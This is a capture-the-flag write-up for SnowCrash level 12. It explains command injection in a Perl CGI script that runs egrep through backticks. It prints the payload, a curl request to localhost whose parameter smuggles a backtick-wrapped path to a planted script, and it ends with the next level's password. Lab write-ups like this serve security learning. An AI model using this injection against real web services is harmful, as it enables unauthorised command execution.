In Level 12, we are tasked with exploiting a Perl CGI script (level12.pl) that accepts parameters through HTTP requests. The script utilizes backticks to execute shell commands based on user input, which opens up an opportunity for command injection.

## Description of the Script
The level12.pl script works as follows:

### 1. Input Handling:

* It accepts two parameters via HTTP: x and y.
* The parameter x is capitalized, and anything after the first space is removed.

### 2. Command Execution:

* The script attempts to match the capitalized x parameter against the contents of the file /tmp/xd using the egrep command.
* If a match is found in the second column of the file, it checks if the y parameter matches the corresponding value.

### 3. Output:

The script returns .. if a match is found, otherwise it returns a dot (.).

# Exploitation Strategy

To exploit the command execution vulnerability, the following steps were taken:

## 1. Create an Exploit Script:

An exploit script was created at `/tmp/EXPLOIT` that contains the command `getflag > /tmp/flag12`. This command, when executed, retrieves the flag and writes it to a file.

``` bash
level12@SnowCrash:~$ echo 'getflag > /tmp/flag12' > /tmp/EXPLOIT
level12@SnowCrash:~$ chmod +x /tmp/EXPLOIT
```

## 2. Craft the CURL Request:

* A CURL request was crafted to execute the exploit script. The x parameter was set to \/*/EXPLOIT``. The use of backticks allows the script to execute the contents of the exploit file.

``` bash
level12@SnowCrash:~$ curl "localhost:4646?x=\`/*/EXPLOIT\`"
```

## 3. Retrieve the Flag:

After executing the CURL command, the output of the getflag command was written to /tmp/flag12.

``` bash
level12@SnowCrash:~$ cat /tmp/flag12
```

## Enter Level 13

level12@SnowCrash:~$ su level13
Password: g1qKMiRpXf53AWhDaU7FEkczr